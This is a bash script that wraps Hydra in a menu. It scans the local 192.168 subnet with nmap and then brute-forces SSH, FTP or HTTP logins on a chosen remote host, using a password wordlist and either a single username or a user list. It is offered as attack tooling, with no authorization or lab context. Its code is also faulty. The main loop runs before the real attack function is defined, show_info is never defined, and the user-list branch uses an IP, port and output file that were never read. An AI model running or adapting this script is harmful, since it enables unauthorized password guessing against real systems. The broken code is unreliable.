#!/bin/bash

log_file="/var/log/hydra_script.log"
password_file=""
wordlist_file=""
user_list_file=""
username=""
user_list_option=""

# Verify if the user is root
if [ "$EUID" -ne 0 ]; then
    echo "###########################################"
    echo "#                                         #"
    echo "#  ⚠️  Please, run this script as root    #"
    echo "#        using 'sudo'.                     #"
    echo "#                                         #"
    echo "###########################################"
    exit 1
fi

# Function to clear the screen
clear_screen() {
    clear
}

# Function to write to the log file
log_message() {
    echo "$(date): $1" >> "$log_file"
}

# Function to select the user type (single or list)
select_user_option() {
    clear_screen
    echo "Select the user type:"
    echo "1. Single user"
    echo "2. User list"
    read -p "Select an option: " user_option

    case $user_option in
        1)
            read -p "Enter the username: " username
            echo "User $username entered."
            ;;
        2)
            read -p "Enter the location of the file with the user list: " user_list_file
            echo "Location of the file with the user list saved."
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
}

# Function to select the type of attack
select_attack_option() {
    clear_screen
    echo "Select the type of attack:"
    echo "1. Brute force attack"
    echo "2. Other type of attack"
    read -p "Select an option: " attack_option

    case $attack_option in
        1)
            attack_service
            ;;
        2)
            echo "Function for other type of attack"
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
}

# Function to perform brute force attack on a remote machine's service
attack_service() {
    select_user_option  
}

# Main menu
while true; do
    clear_screen
    echo "Main menu:"
    echo "1. Enter the file where passwords are stored"
    echo "2. Perform brute force attack on a remote machine's service"
    echo "3. Delete / change the wordlist from point 1"
    echo "4. Script information"
    echo "5. Exit"

    read -p "Select an option: " main_option

    case $main_option in
        1)
            read -p "Enter the location of the password file: " password_file
            echo "Location of the password file saved."
            ;;
        2)
            attack_service
            ;;
        3)
            echo "Function to delete / change the wordlist"
            ;;
        4)
            echo "Script information"
            ;;
        5)
            echo "Exiting the script..."
            exit 0
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
done

# Function to perform brute force attack on a remote machine's service
attack_service() {
    clear_screen
    echo "Performing network scan..."
    # Get the network
    network=$(ip route | grep -oP '192\.168\.\d{1,3}\.\d{1,3}/\d{1,2}' | head -1)
    
    nmap -sn "$network"
    echo "Network scan complete."

    # Menu to select the service to attack
    echo "Select the service to attack:"
    echo "1. SSH"
    echo "2. FTP"
    echo "3. HTTP"
    echo "4. Back to main menu"
    read -p "Select an option: " service_option

    case $service_option in
        1)
            service="ssh"
            ;;
        2)
            service="ftp"
            ;;
        3)
            service="http"
            ;;
        4)
            show_info
            ;;
        *)
            echo "Invalid option."
            ;;
    esac

    select_user_option  # Select user type (single or list)

    if [ -n "$username" ]; then
        read -p "Enter the IP address of the service: " target_ip
        read -p "Enter the service port: " target_port
        read -p "Enter the output file name: " output_file

        echo "Performing brute force attack on $service at $target_ip on port $target_port..."
        hydra -l "$username" -P "$password_file" "$target_ip" -s "$target_port" "$service" > "$output_file"
        echo "Attack completed. Results saved in $output_file."
        read -n 1 -s -r -p "Press any key to continue..."
        show_info
    elif [ -n "$user_list_file" ]; then
        # Logic to attack with user list
        echo "Performing brute force attack with user list on $service at $target_ip on port $target_port..."
        hydra -L "$user_list_file" -P "$password_file" "$target_ip" -s "$target_port" "$service" > "$output_file"
        echo "Attack completed. Results saved in $output_file."
        read -n 1 -s -r -p "Press any key to continue..."
        show_info
    else
        echo "No users or user lists provided."
    fi
}

# Function to read the option selected by the user
read_option() {
    read -p "Select an option: " option

    case $option in
        1)
            clear_screen
            read -p "Enter the location of the password file: " password_file
            echo "Location of the password file saved."
            read -n 1 -s -r -p "Press any key to continue..."
            show_info
            ;;
        2)
            attack_service
            ;;
        3)
            clear_screen
            read -p "Enter the new location of the wordlist file: " wordlist_file
            if [ -f "$wordlist_file" ]; then
                password_file=$wordlist_file
                echo "The new wordlist has been set."
            else
                echo "The file doesn't exist!"
            fi
            read -n 1 -s -r -p "Press any key to continue..."
            show_info
            ;;
        4)
            clear_screen
            echo "Script information:"
            echo "This script uses Hydra to perform brute force attacks."
            read -n 1 -s -r -p "Press any key to continue..."
            show_info
            ;;
        5)
            clear_screen
            echo "Exiting the script."
            exit 0
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
}
